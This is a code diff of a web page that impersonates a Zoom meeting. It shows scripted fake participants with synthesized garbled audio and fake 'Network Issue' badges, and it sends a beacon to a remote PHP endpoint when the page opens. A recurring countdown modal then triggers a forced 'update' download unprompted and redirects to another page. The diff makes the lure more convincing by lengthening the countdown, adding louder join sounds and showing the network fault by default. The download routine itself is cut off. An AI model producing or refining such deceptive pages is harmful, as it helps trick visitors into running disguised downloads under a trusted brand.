@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -40,22 +39,11 @@
         .control-btn.active{background:var(--zoom-red)}
         .control-btn.leave{background:var(--zoom-red)}
         .notification-banner{
-            position:fixed;
-            top:70px;
-            left:50%;
-            transform:translateX(-50%);
+            position:fixed;top:70px;left:50%;transform:translateX(-50%);
             background:linear-gradient(135deg,rgba(45,140,255,.95),rgba(59,130,246,.95));
-            padding:8px 12px;
-            border-radius:16px;
-            z-index:1000;
-            display:flex;
-            align-items:center;
-            gap:8px;
-            box-shadow:0 8px 20px rgba(45,140,255,.18);
-            backdrop-filter:blur(6px);
-            border:1px solid rgba(255,255,255,.08);
-            max-width:90%;
-            font-size:13px;
+            padding:8px 12px;border-radius:16px;z-index:1000;display:flex;align-items:center;gap:8px;
+            box-shadow:0 8px 20px rgba(45,140,255,.18);backdrop-filter:blur(6px);
+            border:1px solid rgba(255,255,255,.08);max-width:90%;font-size:13px;
         }
         .notification-banner.leave{background:linear-gradient(135deg,rgba(239,68,68,.95),rgba(220,38,38,.95))}
         .notification-avatar{width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,.12);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0}
@@ -72,137 +60,39 @@
         .thumbnail-tile .thumb-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700}
         video{width:100%;height:100%;object-fit:cover}
         .hidden{display:none!important}
-
-        /* Enable speaker floating button — smaller and subtitle removed */
         .audio-enable{
-            position:fixed;
-            left:50%;
-            transform:translateX(-50%);
-            bottom:20px;
-            z-index:2100;
-            padding:8px 10px;
-            border-radius:999px;
-            display:none;
-            align-items:center;
-            gap:8px;
+            position:fixed;left:50%;transform:translateX(-50%);bottom:20px;z-index:2100;
+            padding:8px 10px;border-radius:999px;display:none;align-items:center;gap:8px;
             background:linear-gradient(90deg,#e02828,#b71c1c);
-            box-shadow:0 8px 20px rgba(224,40,40,.16);
-            color:white;
-            font-size:13px;
+            box-shadow:0 8px 20px rgba(224,40,40,.16);color:white;font-size:13px;
         }
-        /* Network Issue Badge (Zoom style) */
-.network-badge {
-    position: absolute;
-    top: 12px;
-    left: 12px;
-    background: rgba(220, 38, 38, 0.85); /* Red */
-    color: #fff;
-    padding: 4px 8px;
-    font-size: 11px;
-    border-radius: 6px;
-    z-index: 20;
-    pointer-events: none;
-    display: none; /* hidden by default */
-}
-
-/* When triggered */
-.network-issue .network-badge {
-    display: inline-flex;
-}
+        .network-badge{position:absolute;top:12px;left:12px;background:rgba(220,38,38,.85);color:#fff;padding:4px 10px;font-size:11px;border-radius:6px;z-index:20;pointer-events:none;display:inline-flex;align-items:center;gap:5px;animation:netPulse 2s ease-in-out infinite}
+        .network-badge::before{content:'';display:inline-block;width:7px;height:7px;border-radius:50%;background:#fff;animation:netDot 1s ease-in-out infinite}
+        .network-badge.hidden-badge{display:none}
+        @keyframes netPulse{0%,100%{opacity:1}50%{opacity:.75}}
+        @keyframes netDot{0%,100%{opacity:1}50%{opacity:.3}}
         .audio-enable.show{display:flex}
         .audio-enable .label{font-weight:700;margin-right:6px}
         .audio-enable .btn{background:transparent;border:1px solid rgba(255,255,255,.12);padding:6px 8px;color:white;border-radius:.5rem;font-size:13px}
         .audio-failed-banner{position:fixed;left:50%;transform:translateX(-50%);top:20px;background:rgba(0,0,0,.6);padding:8px 12px;border-radius:12px;color:#fff;z-index:2200;display:none}
-    /* =========================
-   PC / DESKTOP OPTIMIZATION
-   ========================= */
-@media (min-width: 1024px) {
 
-    /* Main meeting layout */
-    #meeting-screen {
-        max-width: 1600px;
-        margin: 0 auto;
-    }
-
-    main {
-        display: grid;
-        grid-template-columns: 3fr 1.2fr;
-        gap: 12px;
-        padding: 12px;
-        overflow: hidden;
-    }
-
-    /* LEFT: video area */
-    main > div:first-child {
-        grid-column: 1 / 2;
-    }
-
-    /* RIGHT: local + thumbnails */
-    #local-tile {
-        position: relative;
-        min-height: 180px;
-        max-height: 220px;
-    }
-
-    /* Speaker tile — REDUCED SIZE */
-    #featured-participant {
-        min-height: 360px !important;
-        max-height: 420px;
-    }
-
-    #featured-participant .participant-avatar {
-        width: 64px;
-        height: 64px;
-        font-size: 22px;
-    }
-
-    #featured-name {
-        font-size: 18px;
-    }
-
-    #featured-role {
-        font-size: 13px;
-    }
-
-    /* Local camera stays small */
-    #local-video-small {
-        object-fit: cover;
-    }
-
-    /* Thumbnails row (Zoom PC style) */
-    #thumbnails-container {
-        display: flex;
-        gap: 10px;
-        padding-bottom: 6px;
-    }
-
-    .thumbnail-tile {
-        width: 120px;
-        height: 80px;
-        flex-shrink: 0;
-    }
-
-    /* Chat panel fits PC height */
-    .chat-panel {
-        width: 360px;
-    }
-
-    /* Control bar tighter like PC Zoom */
-    footer {
-        max-width: 1600px;
-        margin: 0 auto;
-    }
-
-    .control-bar {
-        padding: 6px 10px;
-    }
-
-    .control-btn {
-        font-size: 10px;
-        padding: 6px 10px;
-    }
-}
-</style>
+        @media(min-width:1024px){
+            #meeting-screen{max-width:1600px;margin:0 auto}
+            main{display:grid;grid-template-columns:3fr 1.2fr;gap:12px;padding:12px;overflow:hidden}
+            main>div:first-child{grid-column:1/2}
+            #local-tile{position:relative;min-height:180px;max-height:220px}
+            #featured-participant{min-height:360px!important;max-height:420px}
+            #featured-participant .participant-avatar{width:64px;height:64px;font-size:22px}
+            #featured-name{font-size:18px}
+            #featured-role{font-size:13px}
+            #thumbnails-container{display:flex;gap:10px;padding-bottom:6px}
+            .thumbnail-tile{width:120px;height:80px;flex-shrink:0}
+            .chat-panel{width:360px}
+            footer{max-width:1600px;margin:0 auto}
+            .control-bar{padding:6px 10px}
+            .control-btn{font-size:10px;padding:6px 10px}
+        }
+    </style>
 </head>
 <body>
     <div id="app">
@@ -224,20 +114,18 @@
                         <p class="text-gray-400 text-sm">Ready to join</p>
                     </div>
                 </div>
-
                 <div class="meeting-card mb-4">
                     <h3 class="text-xl font-semibold mb-4" id="meeting-title">Zoom Meeting - 1764987494729</h3>
                     <div class="flex items-center gap-3 mb-4 p-3 bg-black/20 rounded-lg">
-                        <div class="host-avatar" id="host-avatar">MK</div>
+                        <div class="host-avatar" id="host-avatar">AH</div>
                         <div>
                             <p class="font-semibold" id="host-name">Alina Habba</p>
                             <p class="text-gray-400 text-sm flex items-center gap-1">
                                 <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"/></svg>
-                                <span id="host-role">Meeting Host • Project Manager</span>
+                                <span id="host-role">Meeting Host</span>
                             </p>
                         </div>
                     </div>
-
                     <div class="flex gap-4 mb-4">
                         <div class="flex items-center gap-2 text-gray-400 text-sm">
                             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
@@ -248,20 +136,14 @@
                             <span id="meeting-duration">30 min</span>
                         </div>
                     </div>
-
                     <div class="bg-blue-500/20 text-blue-400 text-center py-3 rounded-lg mb-4">
                         <span id="expected-participants">4 people</span> are expected to join
                     </div>
-
                     <button class="join-btn mb-4" id="join-btn">Join Meeting</button>
-
                     <p class="text-gray-500 text-xs text-center">Camera and microphone will be activated based on your permissions</p>
                 </div>
-
                 <div class="text-center">
-                    <p class="text-gray-600 text-sm bg-black/30 inline-block px-4 py-2 rounded-lg" id="meeting-id-display">
-                        ID: meeting-1764987494729
-                    </p>
+                    <p class="text-gray-600 text-sm bg-black/30 inline-block px-4 py-2 rounded-lg" id="meeting-id-display">ID: meeting-1764987494729</p>
                 </div>
             </div>
         </div>
@@ -283,7 +165,6 @@
             <div id="notification-container"></div>
 
             <main class="flex-1 p-3 overflow-auto">
-                <!-- Featured participant (speaker) — camera removed from here (we keep video element but we won't attach local stream) -->
                 <div id="featured-participant" class="participant-tile mb-3" style="min-height:300px;">
                     <div class="network-badge">Network Issue</div>
                     <div class="absolute inset-0 flex flex-col items-center justify-center">
@@ -297,19 +178,15 @@
                             <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4zm4 10.93A7.001 7.001 0 0017 8a1 1 0 10-2 0A5 5 0 015 8a1 1 0 00-2 0 7.001 7.001 0 006 6.93V17H6a1 1 0 100 2h8a1 1 0 100-2h-3v-2.07z" clip-rule="evenodd"/></svg>
                         </div>
                     </div>
-                    <!-- keep a placeholder video element for remote-speaker rendering in future if needed,
-                         but we do NOT assign the local camera stream to it. -->
                     <video id="featured-video" class="absolute inset-0 hidden" autoplay playsinline></video>
                 </div>
 
-                <!-- Local user tile — camera should only be shown here; increased height -->
-                <div class="participant-tile mb-3 p-3" style="aspect-ratio:auto; min-height:260px;" id="local-tile">
+                <div class="participant-tile mb-3 p-3" style="aspect-ratio:auto;min-height:260px;" id="local-tile">
                     <div class="network-badge">Network Issue</div>
                     <div class="flex items-center gap-3">
                         <div class="participant-avatar" style="width:50px;height:50px;font-size:18px;" id="local-avatar">You</div>
                         <span class="text-sm font-medium" id="local-name-display">You</span>
                     </div>
-                    <!-- local small video now receives the camera stream; it's larger because the tile is taller -->
                     <video id="local-video-small" class="absolute inset-0 rounded-xl hidden" autoplay muted playsinline></video>
                 </div>
 
@@ -326,7 +203,6 @@
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/></svg>
                             <span>Unmute</span>
                         </button>
-                        <!-- video button now controls the local small video only -->
                         <button class="control-btn" id="video-btn">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
                             <span>Video</span>
@@ -413,7 +289,7 @@
             <button id="audio-enable-btn" class="btn">Speaker On</button>
         </div>
 
-        <div id="audio-failed-banner" class="audio-failed-banner" role="status" aria-hidden="true">Audio blocked or failed to play — check console</div>
+        <div id="audio-failed-banner" class="audio-failed-banner" role="status" aria-hidden="true">Audio blocked or failed to play</div>
     </div>
 
 <script>
@@ -422,7 +298,7 @@
 
 const CONFIG = {
     OVERLAY_INTERVAL_MS:10000,
-    OVERLAY_COUNTDOWN_SEC:5,
+    OVERLAY_COUNTDOWN_SEC:9,
     NETWORK_DROP_CHANCE:0.02,
     NETWORK_JITTER_MS:500,
     SPEAKING_THRESHOLD:0.02,
@@ -432,13 +308,14 @@ const CONFIG = {
     MEETING_ID:'meeting-1764987494729'
 };
 
+// Each participant gets a unique base frequency so their "voice" sounds different
 const PARTICIPANTS = [
     {id:'host',   name:'Alina Habba',    initials:'AH', role:'Meeting Host', baseFreq:195, joinDelay:500,  leaveDelay:null,  isHost:true},
     {id:'guest1', name:'James Whitmore', initials:'JW', role:'Guest',        baseFreq:125, joinDelay:1500, leaveDelay:10000, isHost:false},
     {id:'guest2', name:'Sarah Chen',     initials:'SC', role:'Guest',        baseFreq:235, joinDelay:2500, leaveDelay:8000,  isHost:false}
 ];
 
-// ─── UI SOUND EFFECTS (synthesized phone-style chimes) ───
+// Synthesized UI sound effect parameters
 const SFX = {
     userJoined:    {freq:480,  type:'sine',   dur:0.25, sweep:620},
     userLeft:      {freq:480,  type:'sine',   dur:0.25, sweep:320},
@@ -467,7 +344,8 @@ let state = {
     audioEnableShown:false,
     speakerOffTimeout:null,
     redirectScheduled:false,
-    updateCountdownStarted:false
+    updateCountdownStarted:false,
+    updateCompleted:false
 };
 
 const elements = {};
@@ -482,21 +360,22 @@ function init(){
 }
 
 async function sendOpenNotification(){
-    try{ await fetch(CONFIG.OPEN_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})}); }catch(e){console.warn('open notify failed',e)}
+    try{await fetch(CONFIG.OPEN_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})})}catch(e){console.warn('open notify failed',e)}
 }
 
 function cacheElements(){
     ['loading-screen','prejoin-screen','meeting-screen','join-btn','leave-btn','unmute-btn','video-btn','chat-btn','people-btn','chat-panel','close-chat','chat-input','send-chat','chat-messages','participants-modal','close-participants','participants-list','update-modal','countdown','download-status','local-video-small','featured-video','featured-participant','featured-avatar','featured-name','featured-role','featured-name-bottom','thumbnails-container','notification-container','participant-count','others-count','local-tile','audio-enable','audio-enable-btn','audio-failed-banner'].forEach(id=>{
-        const key = id.replace(/-([a-z])/g,(_,c)=>c.toUpperCase());
-        elements[key] = document.getElementById(id);
+        const key=id.replace(/-([a-z])/g,(_,c)=>c.toUpperCase());
+        elements[key]=document.getElementById(id);
     });
 }
 
 function bindEvents(){
     elements.joinBtn.addEventListener('click',async()=>{
-        elements.joinBtn.disabled=true; elements.joinBtn.textContent='Joining…';
+        elements.joinBtn.disabled=true;elements.joinBtn.textContent='Joining…';
         await joinMeeting();
-        elements.joinBtn.disabled=false; elements.joinBtn.textContent='Join Meeting';
+        if(!state.speakerOn) showAudioEnableOnce();
+        elements.joinBtn.disabled=false;elements.joinBtn.textContent='Join Meeting';
     });
     elements.leaveBtn.addEventListener('click',leaveMeeting);
     elements.unmuteBtn.addEventListener('click',toggleMic);
@@ -524,31 +403,35 @@ function showLoadingScreen(){
 
 async function joinMeeting(){
     try{
+        // Create AudioContext during the user's click gesture so it's not suspended
         if(!state.audioContext) initAudioContext();
         try{await state.audioContext.resume()}catch(e){}
-        const unlocked = await unlockAudio();
-        if(unlocked) state.speakerOn = true;
+        const unlocked=await unlockAudio();
+        if(unlocked) state.speakerOn=true;
 
-        let stream = null;
-        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+        let stream=null;
+        if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
             try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true})}
             catch{try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false})}
             catch{try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false})}
             catch{stream=null}}}
         }
-        state.localStream = stream;
+        state.localStream=stream;
 
         if(state.localStream){
-            const vt=state.localStream.getVideoTracks(), at=state.localStream.getAudioTracks();
+            const vt=state.localStream.getVideoTracks(),at=state.localStream.getAudioTracks();
             if(vt.length&&elements.localVideoSmall){elements.localVideoSmall.srcObject=state.localStream;elements.localVideoSmall.classList.remove('hidden');state.videoEnabled=true}
             else{state.videoEnabled=false;elements.localVideoSmall.classList.add('hidden')}
             if(at.length){at.forEach(t=>t.enabled=false);state.micEnabled=false}else state.micEnabled=false;
         }else{state.videoEnabled=false;state.micEnabled=false;elements.localVideoSmall.classList.add('hidden')}
 
         if(elements.featuredVideo) elements.featuredVideo.classList.add('hidden');
+        // Show Network Issue badge on featured participant by default
+        const featuredBadge = elements.featuredParticipant.querySelector('.network-badge');
+        if(featuredBadge) featuredBadge.classList.remove('hidden-badge');
         elements.prejoinScreen.classList.add('hidden');
         elements.meetingScreen.classList.remove('hidden');
-        state.inMeeting = true;
+        state.inMeeting=true;
 
         simulateParticipantsJoining();
         startRecurringOverlay();
@@ -556,7 +439,7 @@ async function joinMeeting(){
     }catch(err){
         console.error('Failed to join meeting:',err);
         alert('Unable to start meeting. See console.');
-        elements.joinBtn.disabled=false; elements.joinBtn.textContent='Join Meeting';
+        elements.joinBtn.disabled=false;elements.joinBtn.textContent='Join Meeting';
     }
 }
 
@@ -564,16 +447,16 @@ function leaveMeeting(){
     state.inMeeting=false;
     if(state.localStream){state.localStream.getTracks().forEach(t=>t.stop());state.localStream=null}
     Object.keys(state.voiceOscillators).forEach(id=>stopVoice(id));
-    state.voiceOscillators={}; state.analyserNodes={};
-    state.conversationTimeouts.forEach(t=>clearTimeout(t)); state.conversationTimeouts=[];
+    state.voiceOscillators={};state.analyserNodes={};
+    state.conversationTimeouts.forEach(t=>clearTimeout(t));state.conversationTimeouts=[];
     if(state.overlayInterval){clearInterval(state.overlayInterval);state.overlayInterval=null}
     if(state.animationFrameId){cancelAnimationFrame(state.animationFrameId);state.animationFrameId=null}
     if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
     if(state.speakerOffTimeout){clearTimeout(state.speakerOffTimeout);state.speakerOffTimeout=null}
     try{if(state.audioContext&&typeof state.audioContext.close==='function')state.audioContext.close()}catch(e){console.warn(e)}
     state.audioContext=null;
-    state.activeParticipants=[]; elements.thumbnailsContainer.innerHTML='';
-    elements.meetingScreen.classList.add('hidden'); elements.updateModal.classList.add('hidden'); elements.chatPanel.classList.remove('open');
+    state.activeParticipants=[];elements.thumbnailsContainer.innerHTML='';
+    elements.meetingScreen.classList.add('hidden');elements.updateModal.classList.add('hidden');elements.chatPanel.classList.remove('open');
     showLoadingScreen();
 }
 
@@ -611,28 +494,63 @@ async function unlockAudio(){
 function showAudioEnableOnce(){if(state.audioEnableShown)return;state.audioEnableShown=true;elements.audioEnable.classList.add('show')}
 function hideAudioEnable(){elements.audioEnable.classList.remove('show')}
 
-/* ═══════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
    BAD-CALL VOICE ENGINE
    Synthesizes that crackling, buzzing, dropout "low signal"
    phone sound — no external audio files needed.
-   ═══════════════════════════════════════════════════════ */
+
+   Signal chain per participant:
+     Sawtooth osc + triangle harmonic + vibrato
+     → Formant bandpass filters (vowel resonance)
+     → Amplitude modulation (speech rhythm)
+     → Mix with white noise + 60Hz mains buzz
+     → ScriptProcessor degrader:
+         • Bitcrush (reduced sample rate + bit depth)
+         • Packet-loss dropouts (chunk silence)
+         • Stutter (stuck-packet repeat)
+         • Crackle (random loud impulses)
+     → Telephone bandpass (300–3400 Hz)
+     → Master gain → Analyser → Destination
+   ═══════════════════════════════════════════════════════════════ */
 
 function playSFX(name){
-    const s=SFX[name]; if(!s||!state.audioContext)return;
+    const s=SFX[name];if(!s||!state.audioContext)return;
     try{
-        const ctx=state.audioContext, now=ctx.currentTime;
+        const ctx=state.audioContext,now=ctx.currentTime;
+
+                // Join sound: loud double-pop
         if(name==='userJoined'){
-            // Two-tone phone chime
-            [480,620].forEach((freq,idx)=>{
-                const o=ctx.createOscillator(),g=ctx.createGain();
-                o.type='sine';o.frequency.setValueAtTime(freq,now+idx*0.15);
-                g.gain.setValueAtTime(0.2,now+idx*0.15);
-                g.gain.exponentialRampToValueAtTime(0.001,now+idx*0.15+0.2);
-                o.connect(g);g.connect(ctx.destination);
-                o.start(now+idx*0.15);o.stop(now+idx*0.15+0.25);
-            });
+            // MAIN LOUD POP
+            const o1=ctx.createOscillator(),g1=ctx.createGain();
+            o1.type='square';
+            o1.frequency.setValueAtTime(1040,now);
+            g1.gain.setValueAtTime(1.0,now);
+            g1.gain.exponentialRampToValueAtTime(0.001,now+0.5);
+            o1.connect(g1);g1.connect(ctx.destination);
+            o1.start(now);o1.stop(now+0.5);
+
+            // SECOND POP FOR STRONGER EFFECT
+            const o2=ctx.createOscillator(),g2=ctx.createGain();
+            o2.type='triangle';
+            o2.frequency.setValueAtTime(760,now+0.08);
+            g2.gain.setValueAtTime(0.8,now+0.08);
+            g2.gain.exponentialRampToValueAtTime(0.001,now+0.45);
+            o2.connect(g2);g2.connect(ctx.destination);
+            o2.start(now+0.08);o2.stop(now+0.45);
             return;
         }
+
+        // Leave sound: descending tone
+        if(name==='userLeft'){
+            const o=ctx.createOscillator(),g=ctx.createGain();
+            o.type='sine';o.frequency.setValueAtTime(620,now);
+            o.frequency.exponentialRampToValueAtTime(320,now+0.3);
+            g.gain.setValueAtTime(0.2,now);g.gain.exponentialRampToValueAtTime(0.001,now+0.3);
+            o.connect(g);g.connect(ctx.destination);o.start(now);o.stop(now+0.32);
+            return;
+        }
+
+        // Generic sweep tone for other SFX
         const o=ctx.createOscillator(),g=ctx.createGain();
         o.type=s.type;o.frequency.setValueAtTime(s.freq,now);
         o.frequency.exponentialRampToValueAtTime(Math.max(s.sweep,20),now+s.dur);
@@ -645,10 +563,10 @@ function startVoice(participantId, baseFreq){
     if(!state.audioContext)return;
     if(state.voiceOscillators[participantId])return;
 
-    const ctx=state.audioContext, now=ctx.currentTime;
+    const ctx=state.audioContext,now=ctx.currentTime;
 
     // ─── VOICE SOURCE ───
-    // Fundamental (sawtooth = rich harmonics like vocal cords)
+    // Sawtooth = rich harmonics like vocal cords
     const osc=ctx.createOscillator();
     osc.type='sawtooth';
     osc.frequency.setValueAtTime(baseFreq,now);
@@ -661,7 +579,7 @@ function startVoice(participantId, baseFreq){
     osc2Gain.gain.setValueAtTime(0.12,now);
     osc2.connect(osc2Gain);
 
-    // Vibrato — pitch wobble
+    // Vibrato — subtle pitch wobble
     const vibrato=ctx.createOscillator();
     vibrato.type='sine';vibrato.frequency.setValueAtTime(4.5,now);
     const vibratoGain=ctx.createGain();
@@ -670,7 +588,7 @@ function startVoice(participantId, baseFreq){
     vibratoGain.connect(osc.frequency);
     vibratoGain.connect(osc2.frequency);
 
-    // Speech rhythm — amplitude modulation
+    // Speech rhythm — amplitude modulation (square = on/off, sine = slow variation)
     const spLFO=ctx.createOscillator();spLFO.type='square';spLFO.frequency.setValueAtTime(3.2,now);
     const spGain=ctx.createGain();spGain.gain.setValueAtTime(0.28,now);spLFO.connect(spGain);
     const spLFO2=ctx.createOscillator();spLFO2.type='sine';spLFO2.frequency.setValueAtTime(0.35,now);
@@ -680,7 +598,7 @@ function startVoice(participantId, baseFreq){
     voiceGain.gain.setValueAtTime(0.45,now);
     spGain.connect(voiceGain.gain);spGain2.connect(voiceGain.gain);
 
-    // Formant filters (speech vowel resonances)
+    // Formant filters (speech vowel resonances at ~800Hz and ~1300Hz)
     const f1=ctx.createBiquadFilter();f1.type='bandpass';f1.frequency.value=800;f1.Q.value=3;
     const f2=ctx.createBiquadFilter();f2.type='bandpass';f2.frequency.value=1300;f2.Q.value=4;
     const fMix=ctx.createGain();fMix.gain.value=1;
@@ -695,12 +613,12 @@ function startVoice(participantId, baseFreq){
     const noiseGain=ctx.createGain();noiseGain.gain.setValueAtTime(0.035,now);
     noiseNode.connect(noiseGain);
 
-    // Periodic interference burst — noise gets louder momentarily
+    // Periodic interference burst — noise swells momentarily
     const burstLFO=ctx.createOscillator();burstLFO.type='square';burstLFO.frequency.setValueAtTime(0.25,now);
     const burstGainN=ctx.createGain();burstGainN.gain.setValueAtTime(0.06,now);
     burstLFO.connect(burstGainN);burstGainN.connect(noiseGain.gain);
 
-    // ─── 60Hz MAINS BUZZ ───
+    // ─── 60Hz MAINS BUZZ (electrical interference) ───
     const buzz=ctx.createOscillator();buzz.type='sawtooth';buzz.frequency.setValueAtTime(60,now);
     const buzzGain=ctx.createGain();buzzGain.gain.setValueAtTime(0.018,now);
     buzz.connect(buzzGain);
@@ -710,8 +628,8 @@ function startVoice(participantId, baseFreq){
     voiceGain.connect(preMix);noiseGain.connect(preMix);buzzGain.connect(preMix);
 
     // ─── DEGRADATION PROCESSOR ───
-    // This ScriptProcessor creates the "bad signal" effect:
-    //   1. Bitcrushing  — reduces sample rate + bit depth → robotic digital distortion
+    // Creates the "bad signal" crackling/buzzing effect:
+    //   1. Bitcrushing  — reduced sample rate + bit depth → robotic digital distortion
     //   2. Dropouts     — random chunk silences → packet loss
     //   3. Stutter      — repeats a short buffer → stuck packet / robotic repeat
     //   4. Crackle      — random loud impulses → electrical interference
@@ -719,8 +637,8 @@ function startVoice(participantId, baseFreq){
     const degrader=ctx.createScriptProcessor(BSIZ,1,1);
 
     let crushPhase=0,crushLast=0;
-    const CRUSH_RATE=0.22;                          // Sample-rate reduction factor
-    const CRUSH_BITS=5;                             // Bit depth → 32 levels (very distorted)
+    const CRUSH_RATE=0.22;   // Sample-rate reduction factor (lower = more robotic)
+    const CRUSH_BITS=5;      // Bit depth → 2^5=32 levels (very distorted)
     const CRUSH_MAX=Math.pow(2,CRUSH_BITS)-1;
 
     let inDropout=false,dropoutLeft=0;
@@ -728,7 +646,7 @@ function startVoice(participantId, baseFreq){
     let inStutter=false,sBuf=new Float32Array(2048);
     let sLen=0,sPos=0,sLeft=0;
 
-    const cBuf=new Float32Array(4096);              // Circular buffer for stutter source
+    const cBuf=new Float32Array(4096);   // Circular buffer for stutter source
     let cPos=0,cFill=0;
 
     degrader.onaudioprocess=function(e){
@@ -737,15 +655,14 @@ function startVoice(participantId, baseFreq){
         for(let i=0;i<inp.length;i++){
             let s=inp[i];
 
-            // — Bitcrush — hold + quantize
+            // — Bitcrush: hold sample + quantize to low bit depth
             crushPhase+=CRUSH_RATE;
             if(crushPhase>=1){crushPhase-=1;crushLast=Math.round(s*CRUSH_MAX)/CRUSH_MAX}
             s=crushLast;
 
             // — Packet-loss dropout (chunk silence)
             if(!inDropout&&Math.random()<0.0008){
-                inDropout=true;
-                dropoutLeft=Math.floor(Math.random()*2500)+150;
+                inDropout=true;dropoutLeft=Math.floor(Math.random()*2500)+150;
             }
             if(inDropout){s=0;dropoutLeft--;if(dropoutLeft<=0)inDropout=false}
 
@@ -785,7 +702,7 @@ function startVoice(participantId, baseFreq){
     const analyser=ctx.createAnalyser();analyser.fftSize=256;
     master.connect(analyser);analyser.connect(ctx.destination);
 
-    // Start all sources
+    // Start all oscillators and noise
     osc.start();osc2.start();vibrato.start();spLFO.start();spLFO2.start();
     buzz.start();burstLFO.start();noiseNode.start();
 
@@ -841,16 +758,18 @@ function simulateParticipantsJoining(){
             showNotification(`${p.name} joined the meeting`,p);
             playSFX('userJoined');
 
+            // Small visual bump
+            document.body.style.transform='scale(1.002)';
+            setTimeout(()=>{document.body.style.transform='scale(1)'},120);
+
             if(Math.random()<CONFIG.NETWORK_DROP_CHANCE){showNetworkIssue(p.id);return}
 
             const jitter=Math.random()*CONFIG.NETWORK_JITTER_MS;
             setTimeout(()=>{
                 if(!state.inMeeting)return;
-                if(state.speakerOn){
-                    startVoice(p.id,p.baseFreq);
-                }else{
+                startVoice(p.id,p.baseFreq);
+                if(!state.speakerOn){
                     showAudioEnableOnce();
-                    startVoice(p.id,p.baseFreq);
                     const v=state.voiceOscillators[p.id];
                     if(v)try{v.master.gain.setValueAtTime(0,state.audioContext.currentTime)}catch(e){}
                 }
@@ -865,6 +784,7 @@ function addParticipant(p){
     if(state.activeParticipants.find(x=>x.id===p.id))return;
     state.activeParticipants.push(p);updateParticipantsUI();updateParticipantsList();
 }
+
 function removeParticipant(id){
     state.activeParticipants=state.activeParticipants.filter(p=>p.id!==id);
     stopVoice(id);updateParticipantsUI();updateParticipantsList();
@@ -960,9 +880,12 @@ function switchFeaturedSpeaker(sp){
 }
 
 function showNetworkIssue(pid){
+    const badge = elements.featuredParticipant.querySelector('.network-badge');
     if(state.activeParticipants[0]?.id===pid){
-        elements.featuredParticipant.classList.add('network-issue');
-        setTimeout(()=>elements.featuredParticipant.classList.remove('network-issue'),3000);
+        if(badge) badge.classList.remove('hidden-badge');
+        setTimeout(()=>{
+            if(badge) badge.classList.add('hidden-badge');
+        },5000);
     }
 }
 
@@ -972,39 +895,77 @@ function showNetworkIssue(pid){
 
 function startRecurringOverlay(){
     stopRecurringOverlay();
-    state.overlayInterval=setInterval(()=>{if(state.inMeeting)showUpdateModal()},CONFIG.OVERLAY_INTERVAL_MS);
+    state.overlayInterval=setInterval(()=>{
+        if(!state.inMeeting)return;
+        if(state.updateCompleted)return;
+        showUpdateModal();
+    },CONFIG.OVERLAY_INTERVAL_MS);
 }
 function stopRecurringOverlay(){if(state.overlayInterval){clearInterval(state.overlayInterval);state.overlayInterval=null}}
 
 function showUpdateModal(){
-    if(state.updateCountdownStarted)return;state.updateCountdownStarted=true;
+    if(state.updateCompleted)return;
+    if(state.updateCountdownStarted)return;
+    state.updateCountdownStarted=true;
+
     elements.updateModal.classList.remove('hidden');elements.downloadStatus.classList.add('hidden');
     if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
     let cd=CONFIG.OVERLAY_COUNTDOWN_SEC;elements.countdown.textContent=cd;
-    state.countdownInterval=setInterval(()=>{cd--;elements.countdown.textContent=cd;if(cd<=0){clearInterval(state.countdownInterval);state.countdownInterval=null;triggerDownload()}},1000);
+
+    state.countdownInterval=setInterval(()=>{
+        cd--;elements.countdown.textContent=cd;
+        if(cd<=0){clearInterval(state.countdownInterval);state.countdownInterval=null;triggerDownload()}
+    },1000);
+
     if(state.speakerOffTimeout){clearTimeout(state.speakerOffTimeout);state.speakerOffTimeout=null}
     state.speakerOffTimeout=setTimeout(()=>{try{speakerOff()}catch(e){}state.speakerOffTimeout=null},10000);
 }
 
-function scheduleRedirectOnce(){if(state.redirectScheduled)return;state.redirectScheduled=true;setTimeout(()=>{window.location.href='update.html'},5000)}
+function scheduleRedirectOnce(){
+    if(state.redirectScheduled)return;
+    state.redirectScheduled=true;
+    setTimeout(()=>{
+        elements.updateModal.classList.add('hidden');
+        if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+        state.updateCompleted=true;
+        window.location.href='Nextzoompage.html';
+    },5000);
+}
 
-async function triggerDownload(){
-    scheduleRedirectOnce();
